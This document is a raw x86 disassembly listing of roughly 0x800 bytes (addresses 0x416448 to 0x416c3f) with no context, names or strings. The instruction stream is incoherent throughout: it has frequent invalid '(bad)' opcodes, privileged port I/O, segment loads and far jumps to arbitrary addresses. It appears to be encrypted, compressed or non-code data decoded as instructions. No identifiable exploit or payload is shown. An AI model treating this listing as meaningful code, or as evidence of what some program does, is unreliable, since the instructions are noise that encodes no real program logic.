  416448:	loop   0x4163e4
  41644a:	enter  0x6654,0x8a
  41644e:	pop    esi
  41644f:	adc    al,0xe8
  416451:	sahf   
  416452:	jno    0x416490
  416454:	xlat   BYTE PTR ds:[ebx]
  416455:	daa    
  416456:	cdq    
  416457:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416458:	sahf   
  416459:	adc    eax,0x94e5006
  41645e:	outs   dx,BYTE PTR ds:[esi]
  41645f:	push   0x9003399e
  416464:	rcr    ebp,1
  416466:	scas   eax,DWORD PTR es:[edi]
  416467:	jecxz  0x4164da
  416469:	xchg   BYTE PTR ds:0xf7d31e0,ch
  41646f:	xchg   esp,eax
  416470:	or     dh,BYTE PTR ds:[esi]
  416473:	mov    ecx,0xabd4bf0e
  416478:	std    
  416479:	and    dh,BYTE PTR [ebp+0x51]
  41647c:	rcl    BYTE PTR [esi+ebx*8+0x3e3505a7],cl
  416483:	jns    0x416406
  416485:	cdq    
  416486:	stos   DWORD PTR es:[edi],eax
  416487:	push   es
  416488:	sub    bl,BYTE PTR [edx+0xc]
  41648b:	xchg   esp,ecx
  41648d:	sahf   
  41648e:	fmul   DWORD PTR [ecx+0x4510a333]
  416494:	lds    ebp,FWORD PTR [eax+0x1d]
  416497:	push   0x21
  416499:	rcr    ch,1
  41649b:	out    0xd4,eax
  41649d:	inc    ecx
  41649e:	push   ebx
  41649f:	das    
  4164a0:	imul   ecx
  4164a2:	(bad)  
  4164a4:	add    BYTE PTR [esi+0x59],dh
  4164a7:	cmp    DWORD PTR [eax+esi*4],esi
  4164aa:	outs   dx,BYTE PTR ds:[esi]
  4164ab:	and    eax,0xdb9f3319
  4164b0:	sub    BYTE PTR [ecx-0x20],dl
  4164b3:	bound  edx,QWORD PTR [edi-0x7a]
  4164b6:	inc    ebx
  4164b7:	sub    cl,BYTE PTR [edi]
  4164b9:	push   edx
  4164ba:	dec    ebx
  4164bb:	pop    ecx
  4164bc:	mov    gs,WORD PTR [ecx+0x51d00f35]
  4164c2:	mov    WORD PTR [edi-0x3aff7782],es
  4164c8:	fnstsw WORD PTR [edx]
  4164ca:	les    eax,FWORD PTR [ebp-0x17]
  4164cd:	into   
  4164ce:	test   DWORD PTR [esi],edi
  4164d0:	cmp    eax,0x4042a281
  4164d5:	push   ebx
  4164d6:	(bad)  
  4164d8:	xchg   ecx,eax
  4164d9:	popa   
  4164da:	or     BYTE PTR [ebx+0x16296531],cl
  4164e0:	stos   DWORD PTR es:[edi],eax
  4164e1:	mov    dl,0x69
  4164e3:	fs ret 0xc7ae
  4164e7:	or     DWORD PTR [ebx+0x23],ebp
  4164ea:	xor    DWORD PTR [eax-0x71],edx
  4164ed:	repz or al,0x1
  4164f0:	in     al,0x8c
  4164f2:	stos   BYTE PTR es:[edi],al
  4164f3:	jmp    0xd421969a
  4164f8:	mov    ds:0x1e0e44d1,al
  4164fd:	inc    ebx
  4164fe:	xlat   BYTE PTR ds:[ebx]
  4164ff:	pop    eax
  416500:	fdivr  QWORD PTR [ebx+edi*1]
  416503:	pop    esp
  416504:	int    0x62
  416506:	add    bl,al
  416508:	icebp  
  416509:	retf   
  41650a:	adc    eax,0xff66b4b0
  41650f:	dec    esi
  416510:	and    eax,0xbe7e075
  416515:	shl    DWORD PTR [ebx+0x73],1
  416518:	xchg   ecx,eax
  416519:	mov    cl,0x93
  41651b:	mov    al,0xf3
  41651d:	xor    ebx,DWORD PTR [esi+ebx*2-0x2552253e]
  416524:	pop    edi
  416525:	push   0x946f0d13
  41652a:	adc    eax,0xc8c074cb
  41652f:	sub    al,BYTE PTR [eax+0x6c1a3468]
  416535:	out    dx,al
  416536:	xchg   esp,eax
  416537:	mov    bh,0x13
  416539:	scas   eax,DWORD PTR es:[edi]
  41653a:	lock mov esi,0x322a805a
  416540:	dec    ebp
  416541:	pop    ds
  416542:	xchg   ebp,eax
  416543:	pop    edx
  416544:	cmove  esp,DWORD PTR [ebx+0x57e953f9]
  41654b:	jl     0x416517
  41654d:	cs aad 0x3f
  416550:	cli    
  416551:	sub    DWORD PTR [ecx+0x142be2b5],0xa31b6ea0
  41655b:	sbb    eax,0x1700a669
  416560:	mov    bl,dl
  416562:	xor    eax,0x1402840a
  416567:	push   esp
  416568:	inc    edx
  416569:	xchg   esi,eax
  41656a:	or     BYTE PTR [edi-0x6c],dl
  41656d:	call   0x1e8e20f9
  416572:	aad    0xdd
  416574:	test   BYTE PTR [ebp-0x2f808485],bl
  41657a:	into   
  41657b:	push   cs
  41657c:	(bad)  
  41657e:	inc    edx
  41657f:	repz daa 
  416581:	stos   DWORD PTR es:[edi],eax
  416582:	imul   edx,DWORD PTR [ebx-0x7824fee7],0x79
  416589:	inc    ebp
  41658a:	mov    dh,BYTE PTR [ebp+eax*1-0x5b]
  41658e:	fisubr DWORD PTR [eax-0x1e517f4d]
  416594:	push   ecx
  416595:	das    
  416596:	push   edi
  416597:	xchg   edi,eax
  416598:	jno    0x416540
  41659a:	fnsave [eax+0x1ad46dbf]
  4165a0:	fist   WORD PTR [ebx]
  4165a2:	jg     0x4165de
  4165a4:	addr16 jmp 0xef8d:0xd7b45ef5
  4165ac:	pop    DWORD PTR [edx]
  4165ae:	mov    esp,DWORD PTR [esi]
  4165b0:	pop    esi
  4165b1:	jle    0x416541
  4165b3:	fstp   QWORD PTR [ebp+0x7a900290]
  4165b9:	and    al,0xe8
  4165bb:	or     al,0x1b
  4165bd:	arpl   bp,ax
  4165bf:	xchg   ecx,eax
  4165c0:	add    ebp,DWORD PTR [esi-0x2b]
  4165c3:	mov    ds:0x4a54660e,al
  4165c8:	lea    ecx,[ebx+0x68]
  4165cb:	ret    0x708
  4165ce:	add    ah,al
  4165d0:	inc    ecx
  4165d1:	xchg   ecx,eax
  4165d2:	test   al,0x36
  4165d4:	xchg   DWORD PTR [ecx],eax
  4165d6:	pop    ss
  4165d7:	rcl    DWORD PTR [edx],1
  4165d9:	pop    ecx
  4165da:	jmp    0x8303bae2
  4165df:	sbb    ah,BYTE PTR [eax+0x171e1fa0]
  4165e5:	ret    0x6aa9
  4165e8:	sub    al,0xd0
  4165ea:	pop    edx
  4165eb:	and    BYTE PTR [edi-0x37c225cc],bl
  4165f1:	pop    es
  4165f2:	push   0xffffffea
  4165f4:	mov    edx,0x3190bd88
  4165f9:	out    0xe6,al
  4165fb:	pop    ecx
  4165fc:	aad    0x5e
  4165fe:	call   0xcb67:0x4916cd90
  416605:	jg     0x416589
  416607:	and    DWORD PTR [edi+0x4f],esi
  41660a:	add    DWORD PTR [ecx+ebp*1+0x16d13e93],esp
  416611:	xchg   edx,eax
  416612:	mov    BYTE PTR ds:0xfa55165a,bh
  416618:	jns    0x4165c1
  41661a:	icebp  
  41661b:	pop    ebp
  41661c:	dec    edx
  41661d:	jmp    0x41663f
  41661f:	or     al,0x56
  416621:	pop    edx
  416622:	xchg   ebx,eax
  416623:	ss fdivr st,st(3)
  416626:	lock mov eax,0xeb38001a
  41662c:	test   BYTE PTR [esi+0x173f44b8],0xa0
  416633:	gs aad 0x67
  416636:	push   ebp
  416637:	fldenv [edi+edi*4-0x2231a03b]
  41663e:	dec    edx
  41663f:	and    BYTE PTR [ebp+0x4a35ccbb],cl
  416645:	mov    ebp,0x6162322c
  41664a:	cmp    bl,BYTE PTR [ecx]
  41664c:	inc    DWORD PTR [esi+0x3e7fd24c]
  416652:	pop    ebp
  416653:	mov    ah,BYTE PTR [ebx]
  416655:	dec    ebx
  416656:	adc    eax,0x2822ed20
  41665b:	in     eax,0xd8
  41665d:	lock sbb al,0x0
  416660:	mov    ds:0x56c3860d,eax
  416665:	sbb    BYTE PTR [eax+eiz*8+0x2b163ffe],0x88
  41666d:	aad    0x3c
  41666f:	test   BYTE PTR [ebp+esi*4+0x19],dh
  416673:	jns    0x41669d
  416675:	inc    ebx
  416676:	inc    edi
  416677:	push   cs
  416678:	retf   0x794a
  41667b:	xchg   esi,eax
  41667c:	adc    al,0xc6
  41667e:	mov    cl,0x74
  416680:	popf   
  416681:	mov    eax,ds:0x7c551877
  416686:	push   esp
  416687:	cdq    
  416688:	std    
  416689:	mov    dl,0x40
  41668b:	jmp    0x9a44:0x107d56ee
  416692:	adc    BYTE PTR [ebp-0x58],dh
  416695:	jl     0x4166aa
  416697:	cmp    DWORD PTR [esi+0x6b53cda4],esp
  41669d:	push   esp
  41669e:	ds push cs
  4166a0:	daa    
  4166a1:	jae    0x416641
  4166a3:	(bad)  
  4166a4:	test   eax,0xbbdd7c5c
  4166a9:	xchg   esp,eax
  4166aa:	xchg   ebx,eax
  4166ab:	pop    eax
  4166ac:	(bad)  
  4166ad:	cs js  0x416666
  4166b0:	mov    ss,WORD PTR [ebx]
  4166b2:	rcr    DWORD PTR [ebx+0x7c],0xff
  4166b6:	sbb    eax,0x8f9e85d1
  4166bb:	cmp    edx,DWORD PTR [edx-0x23]
  4166be:	(bad)  
  4166bf:	js     0x4166ac
  4166c1:	push   ebx
  4166c2:	xchg   bl,cl
  4166c4:	lahf   
  4166c5:	pop    edx
  4166c6:	pop    edx
  4166c7:	pushf  
  4166c8:	fist   DWORD PTR [ecx+0x4b63d07e]
  4166ce:	and    bl,al
  4166d0:	popf   
  4166d1:	jmp    0x4166f3
  4166d3:	subps  xmm7,xmm6
  4166d6:	xchg   ebp,eax
  4166d7:	or     al,0x45
  4166d9:	mov    dh,0xfc
  4166db:	dec    esp
  4166dc:	push   edx
  4166dd:	(bad)  
  4166de:	cld    
  4166df:	int    0x3e
  4166e1:	mov    ebp,0x3ef0749f
  4166e6:	add    DWORD PTR [edx+0x265cb7f6],ebx
  4166ec:	fstp   DWORD PTR [ebp-0x1c]
  4166ef:	ds push ecx
  4166f1:	mov    WORD PTR [ebx+0x26],fs
  4166f4:	enter  0xf82c,0xcc
  4166f8:	xlat   BYTE PTR ds:[ebx]
  4166f9:	dec    ebp
  4166fa:	addr16 pop edi
  4166fc:	scas   al,BYTE PTR es:[edi]
  4166fd:	fimul  WORD PTR [ebx+0x5]
  416700:	pushf  
  416701:	jmp    0x91b9:0x627d225b
  416708:	cmp    eax,0xe368e2be
  41670d:	push   ebp
  41670e:	cdq    
  41670f:	xor    ecx,DWORD PTR [ebp+edi*1+0xc723482]
  416716:	ror    DWORD PTR [esi-0x518b8a1e],0x31
  41671d:	jmp    0x48cc:0xa6cc5cf5
  416724:	add    esp,0xffffff8c
  416727:	rcl    DWORD PTR [edx+0x7e],cl
  41672a:	loopne 0x41678d
  41672c:	jb     0x4166c0
  41672e:	jp     0x41678d
  416730:	mov    ah,0xb5
  416732:	in     eax,0x56
  416734:	jmp    0x416794
  416736:	cmp    DWORD PTR ds:0x330c7e71,edx
  41673c:	fmul   st(5),st
  41673e:	arpl   dx,sp
  416740:	out    0xd0,eax
  416742:	ror    BYTE PTR [eax+0x71845a02],cl
  416748:	add    BYTE PTR [esi+0x38],0x3c
  41674c:	sbb    esi,DWORD PTR [edi-0x54]
  41674f:	and    edi,esi
  416751:	and    cl,BYTE PTR [edi+0x7b]
  416754:	mov    ch,0x52
  416756:	aas    
  416757:	jae    0x4166da
  416759:	or     bl,BYTE PTR [ebx+0xcde7e84]
  41675f:	mov    ds,WORD PTR [ecx]
  416761:	sub    al,0xec
  416763:	xchg   ebx,eax
  416764:	mov    esp,0x5f44cf18
  416769:	add    DWORD PTR [ebp+0x785cfb71],ebp
  41676f:	jnp    0x416758
  416771:	jg     0x416703
  416773:	fsub   QWORD PTR [eax]
  416775:	xchg   ebp,eax
  416776:	loopne 0x416740
  416778:	add    al,0xf6
  41677a:	jmp    0x4167ec
  41677c:	shl    BYTE PTR [esi+0x3862c93c],cl
  416782:	imul   ebx,eax,0x3e0b28b0
  416788:	xchg   DWORD PTR [ebp-0x4aadb5b1],edi
  41678e:	xchg   edx,eax
  41678f:	jae    0x4167f6
  416791:	cmp    eax,0x56aea9b
  416796:	imul   esp,DWORD PTR [eax+edx*1],0xffffffbc
  41679a:	sar    DWORD PTR [esi+0x6],1
  41679d:	inc    ecx
  41679e:	es dec esi
  4167a0:	xchg   ebp,eax
  4167a1:	push   0xffffffc3
  4167a3:	js     0x416788
  4167a5:	xor    cl,BYTE PTR [edx]
  4167a7:	and    DWORD PTR [edi+eiz*2-0x34],ebp
  4167ab:	lods   al,BYTE PTR ds:[esi]
  4167ac:	cs test al,0x5a
  4167af:	mov    WORD PTR [eax],?
  4167b1:	scas   al,BYTE PTR es:[edi]
  4167b2:	outs   dx,DWORD PTR ds:[esi]
  4167b3:	aaa    
  4167b4:	pop    esi
  4167b5:	arpl   WORD PTR [edx+0x59a84149],bp
  4167bb:	ret    
  4167bc:	loop   0x4167dc
  4167be:	mov    ah,0x40
  4167c0:	sahf   
  4167c1:	fld    DWORD PTR ss:[esi]
  4167c4:	push   edi
  4167c5:	fcomp  st(2)
  4167c7:	or     al,0x23
  4167c9:	data16 cmc 
  4167cb:	xor    edi,0x5f787c7a
  4167d1:	mov    dh,0x98
  4167d3:	ja     0x416854
  4167d5:	xor    edx,DWORD PTR [ebx]
  4167d7:	add    BYTE PTR [eax+0x4b],ah
  4167da:	dec    ebx
  4167db:	xor    ch,dh
  4167dd:	mov    ebp,0x1ebd912a
  4167e2:	stc    
  4167e3:	sbb    al,BYTE PTR [edi]
  4167e5:	rcr    ebx,cl
  4167e7:	and    edi,DWORD PTR [ecx-0xf]
  4167ea:	sub    al,0x56
  4167ec:	jmp    0x416838
  4167ee:	xchg   ebp,eax
  4167ef:	cmp    DWORD PTR [ebx],edx
  4167f1:	mov    ecx,0xcf260849
  4167f6:	mov    ebx,0xaeaa92c6
  4167fb:	jno    0x4167e7
  4167fd:	jnp    0x4167a7
  4167ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416800:	xchg   ah,al
  416802:	enter  0xa9c6,0xee
  416806:	fld    TBYTE PTR [ebp-0x313d4a2a]
  41680c:	pop    es
  41680d:	push   edi
  41680e:	mov    eax,ds:0xb17d3e79
  416813:	mov    ebx,0x3aa5cc32
  416818:	out    dx,al
  416819:	push   ebx
  41681a:	pop    edx
  41681b:	mov    esp,0x9e50d0fd
  416820:	stc    
  416821:	and    DWORD PTR [edi+0x5a],esi
  416824:	fisubr WORD PTR [edx-0x1c]
  416827:	cmp    DWORD PTR [edx-0x33],eax
  41682a:	dec    esi
  41682b:	and    dl,BYTE PTR [ecx]
  41682d:	out    0xf6,eax
  41682f:	dec    edx
  416830:	enter  0xc616,0xd0
  416834:	sti    
  416835:	xchg   ebx,eax
  416836:	nop
  416837:	dec    edx
  416838:	mov    edi,0x54ae5d2c
  41683d:	sub    ebp,DWORD PTR [ebx-0x61]
  416840:	stos   BYTE PTR es:[edi],al
  416841:	and    ch,BYTE PTR [ebp+0xe71a8ea]
  416847:	sbb    BYTE PTR ds:0x19805f3f,dl
  41684d:	jge    0x416894
  41684f:	sbb    DWORD PTR [esp+ebx*8-0x6e],ecx
  416853:	std    
  416854:	ret    0x44d6
  416857:	mov    edx,0xe5fd89ea
  41685c:	in     al,0x6e
  41685e:	sub    edi,edx
  416860:	adc    edi,DWORD PTR [edi-0xf8a2640]
  416866:	retf   
  416867:	xlat   BYTE PTR ds:[ebx]
  416868:	ret    0xbb56
  41686b:	sbb    al,0xf8
  41686d:	arpl   WORD PTR [edi+0x40],cx
  416870:	add    edi,DWORD PTR [edi+0x12]
  416873:	push   ss
  416874:	push   ebx
  416875:	push   es
  416876:	mov    al,0x40
  416878:	loope  0x41685c
  41687a:	cmc    
  41687b:	inc    edx
  41687c:	loop   0x4168a1
  41687e:	push   ecx
  41687f:	push   ecx
  416880:	dec    eax
  416881:	adc    al,BYTE PTR [ecx+0x27a7947d]
  416887:	in     al,dx
  416888:	mov    ds:0x3bb5e555,eax
  41688d:	rcl    DWORD PTR ds:0x7e4644bb,cl
  416893:	xor    al,BYTE PTR [esi]
  416895:	mov    DWORD PTR [eax-0x4e18540c],0xe2d70864
  41689f:	jno    0x4168b9
  4168a1:	jg     0x4168b1
  4168a3:	bnd jmp 0x416902
  4168a6:	pop    ss
  4168a7:	loope  0x4168f2
  4168a9:	inc    edx
  4168aa:	fdiv   QWORD PTR [edx-0x7a]
  4168ad:	sbb    esp,DWORD PTR [ebx-0x22]
  4168b0:	dec    ebx
  4168b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4168b2:	or     bl,BYTE PTR [eax]
  4168b4:	(bad)  
  4168b5:	repnz repz out 0x8a,eax
  4168b9:	shl    BYTE PTR [esi-0x6f526993],1
  4168bf:	int3   
  4168c0:	and    bh,dl
  4168c2:	mov    DWORD PTR [ebp+0x6c],0x7397a2f
  4168c9:	pop    esi
  4168ca:	out    dx,eax
  4168cb:	rcr    BYTE PTR [eax-0x157507e3],cl
  4168d1:	stos   BYTE PTR es:[di],al
  4168d3:	(bad)  
  4168d4:	pop    esi
  4168d5:	fidiv  WORD PTR [ecx+0x4a6562b9]
  4168db:	xor    cl,BYTE PTR [edx-0x3194d42b]
  4168e1:	add    DWORD PTR [eax],ebp
  4168e3:	push   edx
  4168e4:	and    ch,bh
  4168e6:	ss popa 
  4168e8:	popf   
  4168e9:	(bad)  
  4168ea:	jle    0x41693b
  4168ec:	inc    edi
  4168ed:	imul   edi,DWORD PTR [ecx+0xe84c6df],0xffffffd2
  4168f4:	ds cmp al,0x6d
  4168f7:	xchg   esp,eax
  4168f8:	jns    0x41691f
  4168fa:	mov    esi,0xa842272c
  4168ff:	sti    
  416900:	outs   dx,DWORD PTR ds:[esi]
  416901:	ss dec edx
  416903:	sahf   
  416904:	and    DWORD PTR [ecx+0x4d5bef2b],esi
  41690a:	out    dx,al
  41690b:	scas   al,BYTE PTR es:[edi]
  41690c:	imul   edx,DWORD PTR [esi-0x72],0x66
  416910:	inc    ebp
  416911:	sbb    ecx,DWORD PTR [edi]
  416913:	add    al,0x26
  416915:	inc    esp
  416916:	cld    
  416917:	mov    esi,ebp
  416919:	(bad)  
  41691a:	sti    
  41691b:	add    ah,BYTE PTR [ecx]
  41691d:	clc    
  41691e:	mov    esp,0x195c78ee
  416923:	inc    ecx
  416924:	or     ecx,0xb5824d0b
  41692a:	cli    
  41692b:	aad    0x26
  41692d:	sahf   
  41692e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41692f:	or     edx,DWORD PTR [ecx+0x2b]
  416932:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416933:	add    dh,BYTE PTR [ecx]
  416935:	imul   ecx,DWORD PTR [ecx+esi*1+0x665f50cd],0x790cba86
  416940:	add    eax,0xf7f787f1
  416945:	mov    fs,WORD PTR [edx+eax*1-0x537fdd11]
  41694c:	sbb    al,0xf0
  41694e:	arpl   WORD PTR [eax],di
  416950:	rol    BYTE PTR [edi+0x4bbc2fad],1
  416956:	jp     0x416907
  416958:	int3   
  416959:	leave  
  41695a:	sbb    eax,DWORD PTR [edx]
  41695c:	pop    esi
  41695d:	inc    ecx
  41695e:	cmp    eax,0x758758e4
  416963:	pop    es
  416964:	fist   WORD PTR [ebp-0x7d]
  416967:	(bad)  
  416968:	popf   
  416969:	dec    ebp
  41696a:	pop    edi
  41696b:	int3   
  41696c:	inc    eax
  41696d:	dec    ebp
  41696e:	icebp  
  41696f:	dec    edx
  416970:	or     BYTE PTR [edi+0x2e],0x0
  416974:	loopne 0x4168fe
  416976:	cli    
  416977:	shl    DWORD PTR [edi+0x3605c402],1
  41697d:	inc    ecx
  41697e:	(bad)  
  416981:	inc    ebx
  416982:	sti    
  416983:	lock stos BYTE PTR es:[edi],al
  416985:	push   ebp
  416986:	test   eax,0x17f86267
  41698b:	sub    ebx,eax
  41698d:	push   edi
  41698e:	fdivr  QWORD PTR ds:0xf99086ec
  416994:	call   0x6a75932a
  416999:	das    
  41699a:	push   ds
  41699b:	leave  
  41699c:	sbb    BYTE PTR [eax],ah
  41699e:	push   eax
  41699f:	dec    ebp
  4169a0:	addr16 into 
  4169a2:	push   ds
  4169a3:	push   0x9460c120
  4169a8:	mov    eax,ds:0x23325321
  4169ad:	sbb    BYTE PTR [esi],al
  4169af:	adc    edx,eax
  4169b1:	sahf   
  4169b2:	add    al,0x56
  4169b4:	call   0x5eb644c0
  4169b9:	push   edi
  4169ba:	push   edi
  4169bb:	(bad)
  4169be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169bf:	pushf  
  4169c0:	or     BYTE PTR [edi-0x8516869],ch
  4169c6:	mov    ah,BYTE PTR [eax]
  4169c8:	xlat   BYTE PTR ds:[ebx]
  4169c9:	repnz adc esi,ebp
  4169cc:	aas    
  4169cd:	pop    ecx
  4169ce:	xchg   ecx,eax
  4169cf:	shl    DWORD PTR [edi-0x1c],1
  4169d2:	xor    eax,0xca271d84
  4169d7:	xchg   DWORD PTR [edx+esi*2-0x49a8f19e],edi
  4169de:	xor    BYTE PTR [edx],bl
  4169e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169e1:	aas    
  4169e2:	xchg   edx,eax
  4169e3:	int3   
  4169e4:	sbb    al,BYTE PTR [eax+0x62]
  4169e7:	adc    bh,BYTE PTR [eax]
  4169e9:	push   ecx
  4169ea:	out    dx,eax
  4169eb:	or     BYTE PTR cs:0x3f6d54b2,0x65
  4169f3:	(bad)  
  4169f4:	(bad)  
  4169f5:	in     eax,0xd
  4169f7:	inc    edi
  4169f8:	jmp    0x3484:0x20c2574f
  4169ff:	call   0x7c9d:0x742641bf
  416a06:	push   ebx
  416a07:	inc    esi
  416a08:	ins    DWORD PTR es:[edi],dx
  416a09:	pop    esi
  416a0a:	mov    ch,0xbb
  416a0c:	popa   
  416a0d:	sbb    BYTE PTR [edx-0x1c079dad],cl
  416a13:	jno    0x416a67
  416a15:	loop   0x416a46
  416a17:	mov    ds:0xaf0ec9db,eax
  416a1c:	mov    al,ds:0x8fb9b6d4
  416a21:	pop    ebx
  416a22:	and    al,0xd6
  416a24:	sub    ch,dh
  416a26:	in     al,0x76
  416a28:	sub    eax,DWORD PTR [ebx]
  416a2a:	xchg   edi,eax
  416a2b:	sub    eax,esp
  416a2d:	pusha  
  416a2e:	fsub   DWORD PTR [edi]
  416a30:	xchg   edi,eax
  416a31:	jg     0x416a76
  416a33:	dec    edi
  416a34:	mov    dl,0x2b
  416a36:	adc    BYTE PTR [ebx-0x6fe6de90],al
  416a3c:	sbb    eax,0x5a1d90b0
  416a41:	push   edx
  416a42:	jnp    0x416a14
  416a44:	cli    
  416a45:	cmp    ah,al
  416a47:	sub    esp,DWORD PTR [ecx-0x3b]
  416a4a:	mov    cl,0x39
  416a4c:	inc    esi
  416a4d:	inc    ebp
  416a4e:	cs ins DWORD PTR es:[edi],dx
  416a50:	pop    ss
  416a51:	jp     0x416a4b
  416a53:	adc    dl,BYTE PTR [edx]
  416a55:	fistp  WORD PTR [ebx-0x18]
  416a58:	shr    BYTE PTR [eax-0x78],cl
  416a5b:	xor    al,0x23
  416a5d:	rol    esp,1
  416a5f:	in     al,0xa
  416a61:	mov    bl,0x6e
  416a63:	test   al,0xdf
  416a65:	retf   
  416a66:	xchg   ecx,eax
  416a67:	out    0xe2,al
  416a69:	push   ecx
  416a6a:	push   ss
  416a6b:	inc    ecx
  416a6c:	push   es
  416a6d:	mov    eax,0x6daad2d5
  416a72:	retf   0xf8a5
  416a75:	das    
  416a76:	or     eax,0x82d328e1
  416a7b:	mov    esp,0x7c88a709
  416a80:	xor    al,0x22
  416a82:	sbb    DWORD PTR [ebx+ecx*8-0x24],0x155b44f2
  416a8a:	repz push ss
  416a8c:	mov    dh,0x63
  416a8e:	dec    ebx
  416a8f:	pop    esp
  416a90:	loope  0x416a1d
  416a92:	lahf   
  416a93:	jmp    0x416a61
  416a95:	mov    esp,ds
  416a97:	xacquire xchg BYTE PTR ss:[ebp+0x70],dl
  416a9c:	adc    edx,edi
  416a9e:	dec    esi
  416a9f:	push   edx
  416aa0:	fild   QWORD PTR [esp+ebx*4+0x34]
  416aa4:	pusha  
  416aa5:	(bad)  
  416aa8:	test   al,0xc0
  416aaa:	leave  
  416aab:	das    
  416aac:	jge    0x416a36
  416aae:	or     eax,0xab79ea6d
  416ab3:	call   0x73f9095
  416ab8:	mov    ch,0xe9
  416aba:	test   eax,0x36e624bd
  416abf:	lea    edi,[ebp+ebx*8-0x45]
  416ac3:	sbb    eax,ebp
  416ac5:	int3   
  416ac6:	repz cmp eax,0xc6a2e3ce
  416acc:	ret    0x5c97
  416acf:	sbb    eax,0x794b807c
  416ad4:	jo     0x416ab6
  416ad6:	mov    ebx,0xc0ca7f0c
  416adb:	out    0xf1,eax
  416add:	dec    edx
  416ade:	sbb    esp,DWORD PTR [edx+0x54bee9b1]
  416ae4:	stc    
  416ae5:	push   ecx
  416ae6:	push   esi
  416ae7:	mov    al,ds:0x5d57ca32
  416aec:	hlt    
  416aed:	imul   eax,DWORD PTR [esp+ebx*1+0x1f],0xdb965eb7
  416af5:	xchg   ecx,eax
  416af6:	sub    eax,0xbc06a726
  416afb:	pop    esi
  416afc:	and    DWORD PTR [esi],esp
  416afe:	and    esp,eax
  416b00:	sbb    al,0xb6
  416b02:	stc    
  416b03:	call   0x97d2117
  416b08:	jmp    0x416b46
  416b0a:	lea    ebx,[edx-0x5886f1cf]
  416b10:	mov    cl,0x82
  416b12:	sbb    cl,bl
  416b14:	pop    ebx
  416b15:	xchg   esp,eax
  416b16:	dec    esp
  416b17:	icebp  
  416b18:	ret    
  416b19:	call   0xbc5e:0xdc8cd892
  416b20:	and    DWORD PTR [edi+0x52877c58],ebp
  416b26:	imul   ebp,edi,0xf09c0bd5
  416b2c:	ret    0x8ae8
  416b2f:	stc    
  416b30:	or     al,0x84
  416b32:	lds    eax,FWORD PTR [ecx+ebp*8+0x4a]
  416b36:	mov    edx,0x69bf0d21
  416b3b:	mov    ds:0x5fe5afb8,al
  416b40:	(bad)  
  416b42:	jbe    0x416ba4
  416b44:	ret    
  416b45:	cmp    eax,0xc4b4ae4f
  416b4a:	mov    ds:0xf0ffe464,eax
  416b4f:	push   0xffffffaa
  416b51:	jnp    0x416b2b
  416b53:	test   cl,0xd1
  416b56:	dec    edi
  416b57:	repz inc edx
  416b59:	call   0xbf0570dd
  416b5e:	xchg   ebx,eax
  416b5f:	or     DWORD PTR [ebp-0x21a1f7e3],ecx
  416b65:	aas    
  416b66:	pop    ebp
  416b67:	test   BYTE PTR [eax-0x44],bl
  416b6a:	outs   dx,BYTE PTR ds:[esi]
  416b6b:	je     0x416b5f
  416b6d:	shl    BYTE PTR [ecx+0xa8d4050],1
  416b73:	push   eax
  416b74:	jl     0x416ba2
  416b76:	popf   
  416b77:	ds popa 
  416b79:	das    
  416b7a:	lahf   
  416b7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b7c:	xor    BYTE PTR [edx-0x4e98bdf9],bh
  416b82:	outs   dx,BYTE PTR ds:[esi]
  416b83:	sti    
  416b84:	mov    edx,0x22f45e66
  416b89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b8a:	scas   eax,DWORD PTR es:[edi]
  416b8b:	pushf  
  416b8c:	hlt    
  416b8d:	dec    esi
  416b8e:	retf   
  416b8f:	mov    dl,bl
  416b91:	fsub   st(1),st
  416b93:	push   ebp
  416b94:	(bad)  [eax+0x7885b6b4]
  416b9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b9b:	shl    BYTE PTR [esi-0x221282c8],cl
  416ba1:	push   edi
  416ba2:	mov    ds:0x8340b43,eax
  416ba7:	adc    al,0x3
  416ba9:	enter  0x6e77,0x65
  416bad:	xor    DWORD PTR [eax+0x1a],esp
  416bb0:	adc    eax,DWORD PTR [eax+0xc45142c]
  416bb6:	mov    edx,0x22a6572b
  416bbb:	(bad)  
  416bbc:	cmp    ecx,DWORD PTR [edx-0x1f]
  416bbf:	jl     0x416c1b
  416bc1:	nop
  416bc2:	aam    0x14
  416bc4:	xor    edx,DWORD PTR [edi]
  416bc6:	(bad)  
  416bc8:	mov    cl,0xcc
  416bca:	xor    BYTE PTR [eax],dl
  416bcc:	sti    
  416bcd:	inc    esi
  416bce:	out    dx,eax
  416bcf:	mov    eax,0xd2170de0
  416bd4:	sahf   
  416bd5:	(bad)  
  416bd6:	pop    esp
  416bd7:	loope  0x416c14
  416bd9:	jp     0x416b83
  416bdb:	gs ins BYTE PTR es:[edi],dx
  416bdd:	dec    edx
  416bde:	test   eax,0x4e6b1782
  416be4:	inc    ebp
  416be5:	or     ah,BYTE PTR [eax]
  416be7:	dec    esp
  416be8:	gs jmp 0x77d7:0x95475969
  416bf0:	add    ebx,0xea339b1b
  416bf6:	xor    al,0x17
  416bf8:	enter  0x4204,0xa7
  416bfc:	push   es
  416bfd:	mov    ebx,0x4790b213
  416c02:	loop   0x416c0c
  416c04:	loopne 0x416baa
  416c06:	hlt    
  416c07:	xchg   edi,eax
  416c08:	pop    esp
  416c09:	dec    ecx
  416c0a:	test   BYTE PTR [ecx+0x63aa4b19],0xa
  416c11:	adc    ebx,DWORD PTR [ebx+0x4b]
  416c14:	push   esp
  416c15:	ja     0x416c4b
  416c17:	ss into 
  416c19:	add    al,0x34
  416c1b:	fldcw  WORD PTR [edi-0x7d802dab]
  416c21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c22:	je     0x416c9b
  416c24:	addr16 jae 0x416bc5
  416c27:	xor    eax,0x62e61ffe
  416c2c:	add    al,0xc3
  416c2e:	mov    dl,0xf1
  416c30:	push   eax
  416c31:	cmp    edi,DWORD PTR [eax+0x7e]
  416c34:	ins    BYTE PTR es:[edi],dx
  416c35:	xor    ecx,esi
  416c37:	neg    esp
  416c39:	out    dx,eax
  416c3a:	mov    eax,0x410686c7
  416c3f:	(bad)  
